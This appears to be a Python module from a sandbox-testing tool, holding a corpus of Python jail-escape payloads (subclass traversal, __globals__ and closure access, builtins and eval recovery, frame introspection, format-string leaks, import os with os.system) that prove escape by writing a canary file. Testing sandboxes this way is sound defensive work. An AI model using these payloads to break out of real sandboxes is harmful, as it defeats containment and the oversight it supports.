"""The attributed payload corpus.

Each payload is a real sandbox-escape attempt drawn from the public technique
catalogs the task points to:

  * pyjailbreaker          -- https://github.com/jailctf/pyjailbreaker
  * python_sandbox_escapes -- https://github.com/moshekaplan/python_sandbox_escapes

Every payload carries:
  * ``id``        -- a short stable handle,
  * ``technique`` -- which of our KNOWN_TECHNIQUES it exercises,
  * ``source``    -- which catalog it comes from,
  * ``code``      -- the payload source. Where a payload needs a target to
                     write to, it uses the global name ``CANARY`` (a path
                     string the prober injects). Writing that file is only
                     possible AFTER a successful escape, so the write itself is
                     the escape evidence.
  * ``note``      -- one line on the mechanism, for the results table.

Payloads that cannot usefully write a file (e.g. the format-string technique,
which can only read attributes into a string) instead store what they recovered
in a ``result`` variable, which the oracle inspects for leaked objects.
"""

from __future__ import annotations

# NB: the \n and indentation inside these strings matter -- they are Python
# source that will be compiled, so keep them syntactically valid.
BUILTIN_CORPUS: list[dict[str, str]] = [
    {
        "id": "subclasses_catch_warnings",
        "technique": "subclasses_traversal",
        "source": "python_sandbox_escapes",
        "code": (
            "for c in ().__class__.__bases__[0].__subclasses__():\n"
            "    if c.__name__ == 'catch_warnings':\n"
            "        b = c()._module.__builtins__\n"
            "        b['open'](CANARY, 'w').write('escaped')\n"
        ),
        "note": "walk __subclasses__ to catch_warnings, recover builtins, open()",
    },
    {
        "id": "subclasses_mro",
        "technique": "subclasses_traversal",
        "source": "pyjailbreaker",
        "code": (
            "obj = ''.__class__.__mro__[1]\n"
            "subs = obj.__subclasses__()\n"
            "result = subs\n"
        ),
        "note": "reach object via __mro__ and list its subclasses",
    },
    {
        "id": "lambda_globals_open",
        "technique": "globals_closure_access",
        "source": "pyjailbreaker",
        "code": "(lambda: 0).__globals__['__builtins__']['open'](CANARY, 'w').write('x')\n",
        "note": "a function's __globals__ exposes the real __builtins__",
    },
    {
        "id": "closure_cell_contents",
        "technique": "globals_closure_access",
        "source": "pyjailbreaker",
        "code": (
            "def outer():\n"
            "    secret = open\n"
            "    return lambda: secret\n"
            "result = outer().__closure__[0].cell_contents\n"
        ),
        "note": "pull a captured variable out of a closure cell",
    },
    {
        "id": "builtins_dict_open",
        "technique": "builtins_restoration",
        "source": "python_sandbox_escapes",
        "code": "__builtins__['open'](CANARY, 'w').write('x')\n",
        "note": "use __builtins__ directly if it leaked in as a dict",
    },
    {
        "id": "builtins_import_os",
        "technique": "builtins_restoration",
        "source": "python_sandbox_escapes",
        "code": "result = __builtins__.__import__('os')\n",
        "note": "recover __import__ and import os",
    },
    {
        "id": "frame_getframe_builtins",
        "technique": "frame_introspection",
        "source": "pyjailbreaker",
        "code": "result = sys._getframe(0).f_builtins['open']\n",
        "note": "sys._getframe exposes the frame's f_builtins",
    },
    {
        "id": "frame_code_globals",
        "technique": "frame_introspection",
        "source": "pyjailbreaker",
        "code": (
            "def f():\n"
            "    pass\n"
            "result = f.__code__.co_consts\n"
        ),
        "note": "reach a function's code object internals",
    },
    {
        "id": "format_class_walk",
        "technique": "format_string_attribute",
        "source": "pyjailbreaker",
        "code": "result = '{0.__class__.__bases__[0]}'.format(())\n",
        "note": "format string walks attributes without a literal '.' access",
    },
    {
        "id": "format_globals_read",
        "technique": "format_string_attribute",
        "source": "pyjailbreaker",
        "code": "result = '{0.__init__.__globals__}'.format(())\n",
        "note": "format string reaches __globals__ as text (info leak)",
    },
    {
        "id": "import_os_system",
        "technique": "import_usage",
        "source": "python_sandbox_escapes",
        "code": (
            "import os\n"
            "os.system('echo escaped > ' + CANARY)\n"
        ),
        "note": "the direct approach: import os and run a command",
    },
    {
        "id": "getattr_by_string",
        "technique": "subclasses_traversal",
        "source": "pyjailbreaker",
        "code": "result = getattr((), '__class__').__bases__[0]\n",
        "note": "fetch __class__ by string to dodge a literal-dot check",
    },
    {
        "id": "eval_recovery",
        "technique": "builtins_restoration",
        "source": "python_sandbox_escapes",
        "code": "result = eval('__import__(\"os\")')\n",
        "note": "if eval is reachable, it defeats everything",
    },
]


def build_corpus(extra_payloads: list[dict] | None = None) -> list[dict]:
    """Return the full corpus: the built-ins plus any user-supplied payloads.

    User payloads (from ``config.extra_payloads``) need at least ``code`` and
    ``technique``; we fill in sensible defaults for the rest so the report
    stays uniform.
    """
    corpus = [dict(p) for p in BUILTIN_CORPUS]
    for i, p in enumerate(extra_payloads or []):
        corpus.append(
            {
                "id": p.get("id", f"custom_{i}"),
                "technique": p["technique"],
                "source": p.get("source", "custom"),
                "code": p["code"],
                "note": p.get("note", "user-supplied payload"),
            }
        )
    return corpus
